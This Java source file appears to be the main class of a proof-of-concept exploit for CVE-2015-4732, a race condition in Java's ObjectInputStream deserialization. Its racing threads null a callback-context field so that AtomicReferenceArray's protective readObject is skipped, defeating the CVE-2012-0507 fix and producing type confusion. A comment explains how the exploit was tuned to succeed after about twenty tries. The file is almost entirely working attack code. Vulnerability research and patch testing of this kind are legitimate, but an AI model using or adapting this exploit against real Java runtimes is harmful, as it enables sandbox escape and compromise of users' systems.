package poc.cve_2015_4732;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectStreamClass;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.atomic.AtomicReferenceArray;

import poc.cve_2015_4732.EXTThread.State;
import poc.cve_2015_4732.OIS.OSCReader;

public class Main {
	
	public static List< EXTThread > EXT_THREADS = new LinkedList< EXTThread >( );
	public static Object[] HANDLES = null;
	
	public static void main( String[] args ) {
		final int numThreads = Runtime.getRuntime().availableProcessors() - 1;
		
		System.err.println( "Creating " + numThreads + " race threads." );
		for( int i = 0; i < numThreads; i++ ) {
			EXT_THREADS.add( new EXTThread( ) );
		}

		int loopCount = 0;
		try {
			while( true ) {
				loopCount++;
				
				boolean success = Main.doRace();
				System.err.print( "Loop " + loopCount );
				if( success ) {
					System.err.println( ": Success." );
					break;
				}
				else {
					System.err.println( ": Failure." );
				}
			}
			System.err.println( "Number of tries: " + loopCount );
		}
		finally {
			System.err.println( "Stopping race threads." );
			for( EXTThread thread : EXT_THREADS ) {
				thread.stopThread();
			}
		}
		
		System.exit( loopCount );
	}
	
	@SuppressWarnings("unchecked")
	private static boolean doRace( ) {
		try {
			/*
			 * This can be made much simpler with a lot less code, but this
			 * 	provides for a reliable win after ~20 attempts.
			 * 
			 * The race happens in two methods in ObjectInputStream
			 * 		- readSerialData
			 * 		- readExternalData
			 * 
			 * In the course of deserializing a serializable class with
			 * 	a readObject method, such as AtomicReferenceArray,
			 * 	ObjectInputStream maintains a SerialCallbackContext
			 * 	to maintain state during calls to outside methods.
			 * 
			 * Now the SerialCallbackContext object internally can only
			 * 	be used from the creating thread, the field holding a reference
			 * 	to that state can be modified from other threads. We use other
			 * 	threads to move the reference onto their stack and null the field
			 * 	to cause AtomicReferenceArray's readObject method to fail.
			 * 
			 * We then release each thread one by one attempting to call
			 * 	defaultReadObject after release. If we win the race we can
			 * 	bypass AtomicReferenceArray's readObject and deserialize an
			 * 	array of our choice into AtomicReferenceArray and we successfully
			 * 	have bypassed the protections added for CVE-2012-0507
			 * 
			 * If we did not win we reset and try again. This usually takes less than
			 * 	20 attempts before a success.
			 * 
			 * 
			 * This is complicated by the fact that there is a lot of code between entry
			 * 	and where the vulnerability exists that is not thread safe. To reduce this
			 * 	we use thread local InputStreams and send the threads in one by one to the closest
			 * 	point before the vulnerability. We hold the threads in the constructor of an 
			 * 	Externalizable object until the main thread is released. This prevents other
			 * 	race conditions from affecting the outcome.
			 */
			Capture.CDL = new CountDownLatch( 1 );
			OIS ois = new OIS( );
			
			ThreadLocalIS.INSTANCE.setInputStream( new ByteArrayInputStream( ByteBuffers.INITIAL_OBJECTS ) );
			ois.readObject();
			
			ois.setOSCReader( new RaceOSCReader( ) );
			for( EXTThread thread : EXT_THREADS ) {
				thread.setOIS( ois );
				thread.waitForState( State.EXT_CON_HOLD );
			}
			
			ThreadLocalIS.INSTANCE.setInputStream( new ByteArrayInputStream( ByteBuffers.RACE_OBJECT ) );
			try {
				ois.readObject( );
			}
			catch( NullPointerException npe ) { }
			catch( Throwable t ) {
				return false;
			}
			ois.setOSCReader( null );
			
			ThreadLocalIS.INSTANCE.setInputStream( new ByteArrayInputStream( ByteBuffers.DEFAULT_READ ) );
			try {
				ois.readObject();
			}
			catch( Throwable t ) { }
			
			Object[] handles = Main.HANDLES;
			if( handles == null ) {
				return false;
			}
			
			AtomicReferenceArray< Object > ara = null;
			Main[] arr = null;
			
			for( Object obj : handles ) {
				if( obj instanceof AtomicReferenceArray ) {
					ara = ( AtomicReferenceArray< Object > ) obj;
				}
				else if( obj instanceof Main[] ) {
					arr = ( Main[] ) obj;
				}
				
				if( ara != null && arr != null ) {
					break;
				}
			}
			
			ara.set( 0, new Object( ) );
			if( ( ( Object ) arr[ 0 ].getClass() ) == Object.class ) {
				return true;
			}
			
			return false;
		}
		catch( Throwable t ) {
			return false;
		}
		finally {
			for( EXTThread thread : EXT_THREADS ) {
				thread.reset();
			}
		}
	}
	
	private static class RaceOSCReader implements OSCReader {

		@Override
		public ObjectStreamClass read( OIS ois ) throws IOException, ClassNotFoundException {
			if( Thread.currentThread() instanceof EXTThread ) {
				return ObjectStreamClass.lookup( Capture.class );
			}
			
			ObjectStreamClass cl = ObjectStreamClass.lookup( AtomicReferenceArray.class );
			Capture.CDL.countDown();
			
			return cl;
		}
		
	}
	
}
